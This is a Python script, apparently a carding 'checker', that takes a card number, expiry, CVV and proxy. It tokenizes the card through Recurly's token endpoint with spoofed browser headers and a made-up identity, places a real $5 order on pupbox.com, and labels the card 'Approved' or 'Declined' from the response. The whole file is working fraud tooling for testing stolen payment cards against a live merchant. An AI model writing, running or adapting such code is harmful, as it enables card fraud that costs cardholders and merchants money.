import uuid
from httpx import AsyncClient

async def recurlyccn3(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        email = f"{uuid.uuid4()}@gmail.com"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://api.recurly.com',
            'priority': 'u=1, i',
            'referer': 'https://api.recurly.com/js/v1/field.html',
            'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'none',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        }

        data = f'first_name=Sebastian&last_name=Gutierrez&country=US&postal_code=07050-3824&number={cc}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-ES&browser[referrer_url]=https%3A%2F%2Fpupbox.com%2Fcheckout&browser[screen_height]=1080&browser[screen_width]=1920&browser[time_zone_offset]=420&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36&month={mes}&year={ano}&cvv=&version=4.32.6&key=ewr1-SVjwyaSF4of0LquOF0PxlF&deviceId=tuk9QzzRDnGtWF70&sessionId=s9fkoVT7CELZnaMQ&instanceId=JTPONYdVZWUqMwOm'

        req1 = await web.post('https://api.recurly.com/js/v1/token', headers=headers, data=data) #type: ignore
        token = req1.json()['id']

        print(token)
        async with AsyncClient(verify=False) as web:
            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://pupbox.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://pupbox.com/checkout',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            params = {
                'cmd': 'shop-checkout',
            }

            data = f'person=Sebastian%20Gutierrez&email={email}&address1=103-105%20Central%20Avenue&city=Orange&state=NJ&zip=07050-3824&country=US&shipping_method=standard&cc_token={token}&cart[0][id]=442101&cart[0][href]=viv-bubbie-holiday-plaid-bandana&cart[0][qty]=1'

            req2 = await web.post('https://pupbox.com/ajax.php', params=params, headers=headers, data=data) #type: ignore
            if "wooId" in req2.text:
                status = "Approved ✅"
                mensaje = "Charged $5.00"
            else:
                mensaje = req2.text.strip('{"error":"').strip('","clear":[]}')
                if "Insufficient funds" in mensaje:
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"
            return status, mensaje